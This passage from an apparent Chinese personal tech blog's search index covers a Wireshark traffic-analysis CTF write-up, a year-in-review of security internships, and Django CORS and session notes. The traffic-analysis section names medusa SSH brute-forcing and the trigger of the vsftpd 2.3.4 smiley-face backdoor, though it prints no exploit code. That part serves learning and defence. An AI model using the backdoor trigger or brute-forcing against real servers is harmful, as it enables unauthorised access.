data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772589738-830ff49d-bc78-46db-8c3e-0065aef1936e.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=942&size=33306&status=done&style=none&width=471" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后查看数据包，发现通信好友名称是 Sec558user1<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772717050-166452db-d6d3-481c-a31a-4f09dc457427.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=870&originWidth=1680&size=214193&status=done&style=none&width=840" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605772717050-166452db-d6d3-481c-a31a-4f09dc457427.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=870&originWidth=1680&size=214193&status=done&style=none&width=840" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="2-通信过程中的第一条信息内容是什么"><a href="#2-通信过程中的第一条信息内容是什么" class="headerlink" title="2. 通信过程中的第一条信息内容是什么"></a>2. 通信过程中的第一条信息内容是什么</h5><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773224776-cf54fa2e-3d3d-42d5-8e46-89aa0bcd5fac.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=754&originWidth=2166&size=186028&status=done&style=none&width=1083" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773224776-cf54fa2e-3d3d-42d5-8e46-89aa0bcd5fac.png#align=left&display=inline&height=377&margin=%5Bobject%20Object%5D&name=image.png&originHeight=754&originWidth=2166&size=186028&status=done&style=none&width=1083" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="3-Ann-通信过程中传输的文件名字"><a href="#3-Ann-通信过程中传输的文件名字" class="headerlink" title="3. Ann 通信过程中传输的文件名字"></a>3. Ann 通信过程中传输的文件名字</h5><p>显示过滤器输入 <code>data</code>，然后追踪tcp流<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773343192-020ba75d-966c-4c61-b195-943db2f8f8be.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=2226&size=395317&status=done&style=none&width=1113" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773343192-020ba75d-966c-4c61-b195-943db2f8f8be.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=2226&size=395317&status=done&style=none&width=1113" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>文件名字<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773432291-4151f4a5-d07b-425a-acd4-fc96474e1da9.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=434&originWidth=1502&size=71877&status=done&style=none&width=751" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605773432291-4151f4a5-d07b-425a-acd4-fc96474e1da9.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=434&originWidth=1502&size=71877&status=done&style=none&width=751" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="4-还原Ann发送文件并得出文件幻数（magic-number）"><a href="#4-还原Ann发送文件并得出文件幻数（magic-number）" class="headerlink" title="4. 还原Ann发送文件并得出文件幻数（magic number）"></a>4. 还原Ann发送文件并得出文件幻数（magic number）</h5><p>文件幻数介绍: <a href="https://baike.baidu.com/item/magic%20number">https://baike.baidu.com/item/magic%20number</a><br>说直白点就是以 zip 之父的首字母PK来命名，对应的16进制是<code>50 4B 03 04</code><br>50(P)4B(K)03(文本结束)04(传输结束)，组合起来就是压缩包的标识开头。<br>那为啥word文档的文件开头是这个，把word文档后缀改为<code>.zip</code>试试，这是微软2006年公布的OOXML规范。</p><p>显示过滤器输入 <code>data</code>，然后追踪tcp流<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775150674-da5faf1e-18e0-402e-8a03-3aacf9cc1659.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=355286&status=done&style=none&width=770" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775150674-da5faf1e-18e0-402e-8a03-3aacf9cc1659.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1540&size=355286&status=done&style=none&width=770" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>另存为，<code>xxx.bin</code>，用16进制编辑器打开<code>xxx.bin</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775249230-11f41003-6bde-4b41-9440-4d6d0f6e3c7f.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1104&size=136063&status=done&style=none&width=552" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775249230-11f41003-6bde-4b41-9440-4d6d0f6e3c7f.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1104&size=136063&status=done&style=none&width=552" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775265569-bae777a6-9d33-4590-b856-bd850b64028f.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1418&size=206237&status=done&style=none&width=709" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775265569-bae777a6-9d33-4590-b856-bd850b64028f.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1418&size=206237&status=done&style=none&width=709" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775368576-d7466692-61fe-442a-b55a-894a35e087ff.png#align=left&display=inline&height=572&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1144&originWidth=2500&size=275400&status=done&style=none&width=1250" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605775368576-d7466692-61fe-442a-b55a-894a35e087ff.png#align=left&display=inline&height=572&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1144&originWidth=2500&size=275400&status=done&style=none&width=1250" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h5 id="5-查看文件md5值"><a href="#5-查看文件md5值" class="headerlink" title="5. 查看文件md5值"></a>5. 查看文件md5值</h5><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605776173099-e81a08f3-c739-4125-a673-7fe95fcc8ae8.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=762&size=57516&status=done&style=none&width=381" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605776173099-e81a08f3-c739-4125-a673-7fe95fcc8ae8.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=762&size=57516&status=done&style=none&width=381" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="应用层网络安全"><a href="#应用层网络安全" class="headerlink" title="应用层网络安全"></a>应用层网络安全</h2><h3 id="暴力破解分析"><a href="#暴力破解分析" class="headerlink" title="暴力破解分析"></a>暴力破解分析</h3><p>分析使用 medusa 破解 ssh 登录<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842165858-a47b2bfd-424f-4bb1-9ccd-251d6bc24d51.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=918&originWidth=1784&size=1844097&status=done&style=none&width=892" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842165858-a47b2bfd-424f-4bb1-9ccd-251d6bc24d51.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=918&originWidth=1784&size=1844097&status=done&style=none&width=892" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="后门分析"><a href="#后门分析" class="headerlink" title="后门分析"></a>后门分析</h3><p>某些软件具有其他的目的 -&gt; 设置隐藏后门<br>这里针对vsftpd 2.3.4 后门<br>帐号密码不要紧，有 <code>:)</code> 笑脸就行，因此这个后门也被称为笑脸后门，2333<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842408016-3afe8bd9-95c9-4f40-bf85-6ea21bdee091.png#align=left&display=inline&height=546&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1092&originWidth=1916&size=714363&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605842408016-3afe8bd9-95c9-4f40-bf85-6ea21bdee091.png#align=left&display=inline&height=546&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1092&originWidth=1916&size=714363&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
          <category> Wireshark </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> Wireshark </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>=======总结 &amp; 手动分割线=======</title>
      <link href="2021/04/01/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/"/>
      <url>2021/04/01/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p>由于 <a href="https://www.notion.so/">notion</a> 和 <a href="https://www.yuque.com/">语雀</a> 使用起来过于舒适，差点忘了自己还有个博客，直到 （逃</p><p><img src="/img/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/image-20210401190333056.png" class="lazyload" data-srcset="/img/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/image-20210401190333056.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210401190333056"></p><p>上次写博客还是大三上学期末，现在都差不多要毕业了。大二大三那会，在学校啥都干，从之前的文章也能看出，服务器运维、开发、CTF….</p><p>顺便做个总结，这一年虽没写博客，不过找了两份实习，一个是做渗透测试、一个是安全攻防研究，还有学校各种各样的事情，好像上次跑 <code>hexo d</code> 还是不久之前（主要是被 notion 和 语雀 惯懒了）…</p><ul><li>2020.4 - 2020.10 渗透测试实习生，算是正式入门网安吧…感谢组内大佬肯收留我个菜鸡，哈哈，一开始还很纠结，以后是做安全还是运维，所以各投了一份实习（刚过完年做师兄的疯狂安利下），面试和准备，发现还是对网安更敢兴趣一些~，所以选了网安。不过现在偶尔会想，要是当初我选了另外一个实习，现在会怎样？（毕竟两边面试都过了），实习过程中被各种带飞，认识了几个大佬，其中的项目经验，都给秋招打下了基础。</li></ul><ul><li>2020.10 - 2020.12 学校项目，模仿大佬的开源项目，结合深度学习和网安和同学一起做了个《基于A2C和MSF的自适应渗透测试工具》，作为代码和文档的主要贡献者，虽然没做到想象中效果，不过也是第一次尝试去学习和改动大佬的开源项目。虽然功能上没能做的很好（不过还是做了许多的不错的优化），但是以后对开源项目都不会有那种陌生的隔离感了（就这个语言学过，也写过项目，但看着大佬写的就是有点抽象）</li></ul><ul><li>2020.11 - 2021.3 安全攻防研究实习生，第一次在大型项目中技术上承担一定角色，挑战很大，过了一个月才习惯这些工作，之前实习主要是渗透，这次还有很多代码审计、尤其是hvv相关的，代码审计任务很繁重，平均一天要审个6000+行代码（而且还是各种语言，有的压根就不怎么熟悉…）。也做了很多尝试，比如威胁建模评审，安全红线落实等，也是第一次接触SDL，也由此知道为啥大厂核心业务漏洞会难挖，毕竟别人都有做SDL流程。当然除此之外，由于我们部门很看重产出，所以这次实习也没上次实习那么轻松。特别是我这个产品线，迭代了很多代，漏洞特别难挖，而且渗透也比较麻烦，因为环境比较复杂，没有在搞站那会随随便便抓个包改改参数那么舒服了~ 当然产出不仅仅是挖洞，还可以有安全研究分享，输出文档等等等等~</li></ul><p>总之就是从之前各种打杂到现在会稍微专注于一个方向，所以成长也挺快的，虽然还是很菜（x，其实主要还是被各种大佬带飞，少走了一些坑 （</p><p>今年，虽然过年很久了，先立一些 flag 吧~，毕竟实习了两次，发现一些东西需要补补了</p><ul><li>SDL，把实习学的做个总结并做一些拓展</li><li>云安全，先把威胁建模学个差不多，然后熟悉一波主流的云基础框架，毕竟工作要用到</li><li>二进制，常见漏洞点和利用方式要掌握，感觉熟悉二进制以后审计C/C++会舒服不少</li><li>代码审计，把白嫖过来的CTFSHOW入门大部分给刷完，巩固一波基础~</li></ul><p>迟些会把一些正常点的笔记放上来，2333</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django踩坑记</title>
      <link href="2020/01/02/django%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
      <url>2020/01/02/django%E8%B8%A9%E5%9D%91%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="python-虚拟环境"><a href="#python-虚拟环境" class="headerlink" title="python 虚拟环境"></a>python 虚拟环境</h3><p>pip install virtualenv<br>pip install virtualenvwrapper-win # windows 使用此命令</p><p>好处,：可以一个环境对应一个项目</p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>一直好奇闭包有什么用，直到学了 django 后的登录装饰器</p><p>闭包的应用：装饰器、面向对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">装饰器的应用</span></span><br><span class="line"><span class="string">如果需要统计一个函数运行的时间，加上装饰器即可，可简化代码</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_timer</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(time.time() - start_time)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@func_timer</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;login success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login()</span><br></pre></td></tr></table></figure><h3 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h3><p>在与 setting.py 同级目录新建一个 py 文件。写入如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SolveCrossDomainMiddleware</span>(<span class="params">MiddlewareMixin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span>(<span class="params">self, request, response</span>):</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>] = <span class="string">&quot;true&quot;</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>] = <span class="string">&quot;http://192.168.123.60:8080&quot;</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>] = [<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/img/Memo/django/django1.png" class="lazyload" data-srcset="/img/Memo/django/django1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django1.png"></p><p>在 settingpy 的 MIDDLEWARE 引入， webproject 与自己的项目名字对应，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;webproject.solveCrossDomain.SolveCrossDomainMiddleware&#x27;</span>,</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/img/Memo/django/django2.png" class="lazyload" data-srcset="/img/Memo/django/django2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django2.png"></p><p>即可解决跨域问题，因为 SolveCrossDomainMiddleware 中已经对 request 和 response 做了处理了</p><h3 id="session-跨域问题"><a href="#session-跨域问题" class="headerlink" title="session 跨域问题"></a>session 跨域问题</h3><p>因为我使用的是 Vue.js + django 前后端分离，因此需要解决 session 跨域问题</p><h4 id="Vue-里加入-因为我使用的是-axios"><a href="#Vue-里加入-因为我使用的是-axios" class="headerlink" title="Vue 里加入 (因为我使用的是 axios"></a>Vue 里加入 (因为我使用的是 axios</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$axios.defaults.withCredentials = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/img/Demo/django/django6.png" class="lazyload" data-srcset="/img/Demo/django/django6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django6.png"></p><h4 id="以下为-django-里的操作"><a href="#以下为-django-里的操作" class="headerlink" title="以下为 django 里的操作"></a>以下为 django 里的操作</h4><p>我使用的是 数据库存储 session， 因此 setting.py 引入的是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line">...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.db&#x27;</span>  <span class="comment"># 引擎（默认）</span></span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_NAME = <span class="string">&quot;sessionid&quot;</span>                <span class="comment"># Session的cookie保存在浏览器上时的key，即：sessionid＝随机字符串（默认）</span></span><br><span class="line">SESSION_COOKIE_PATH = <span class="string">&quot;/&quot;</span>                        <span class="comment"># Session的cookie保存的路径（默认）</span></span><br><span class="line">SESSION_COOKIE_DOMAIN = <span class="literal">None</span>                     <span class="comment"># Session的cookie保存的域名（默认）</span></span><br><span class="line">SESSION_COOKIE_SECURE = <span class="literal">False</span>                    <span class="comment"># 是否Https传输cookie（默认）</span></span><br><span class="line">SESSION_COOKIE_HTTPONLY = <span class="literal">True</span>                   <span class="comment"># 是否Session的cookie只支持http传输（默认）</span></span><br><span class="line">SESSION_COOKIE_AGE = <span class="number">3600</span>                        <span class="comment"># Session的cookie失效日期（默认2周）</span></span><br><span class="line">SESSION_EXPIRE_AT_BROWSER_CLOSE = <span class="literal">False</span>          <span class="comment"># 是否关闭浏览器使得Session过期（默认）</span></span><br><span class="line">SESSION_SAVE_EVERY_REQUEST = <span class="literal">False</span>               <span class="comment"># 是否每次请求都保存Session，默认修改之后才保存（默认）</span></span><br><span class="line"><span class="comment"># !!! 这个一定要加.....</span></span><br><span class="line">SESSION_COOKIE_SAMESITE = <span class="literal">None</span>                   <span class="comment"># 默认为 Lax, 即 get 可跨域, 而 post 不可以</span></span><br></pre></td></tr></table></figure><p>如下图红线区所示</p><p><img src="/img/Memo/django/django3.png" class="lazyload" data-srcset="/img/Memo/django/django3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django3.png"></p><p>在 Vue.js 前端引入</p><h3 id="migrate-无报错，迁移后数据库没有增加表"><a href="#migrate-无报错，迁移后数据库没有增加表" class="headerlink" title="migrate 无报错，迁移后数据库没有增加表"></a>migrate 无报错，迁移后数据库没有增加表</h3><p>我是手动直接删除了 migrations 里面的文件和数据库里面的表格，，然后我改了 models.py 后 makemigrations &amp;&amp; migrate 数据库竟然没有多出表。</p><p><img src="/img/Memo/django/django4.png" class="lazyload" data-srcset="/img/Memo/django/django4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django4.png"></p><p>原来 django 数据库里面，是有这个表格的</p><p><img src="/img/Memo/django/django5.png" class="lazyload" data-srcset="/img/Memo/django/django5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django5.png"></p><p>里面存放着关于数据库迁移的信息，所以我手动删除了迁移表和数据后并没有什么乱用，数据库以为它还是在的，，所以，我选择了删除所以表格，，重新 makemigrations &amp;&amp; migrate 就好了。</p><h4 id="因为这是个人作业，，所以随便删了，生产环境慎用。。。"><a href="#因为这是个人作业，，所以随便删了，生产环境慎用。。。" class="headerlink" title="因为这是个人作业，，所以随便删了，生产环境慎用。。。**"></a>因为这是个人作业，，所以随便删了，生产环境慎用。。。**</h4>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算智能实验</title>
      <link href="2019/12/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/"/>
      <url>2019/12/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/</url>
      
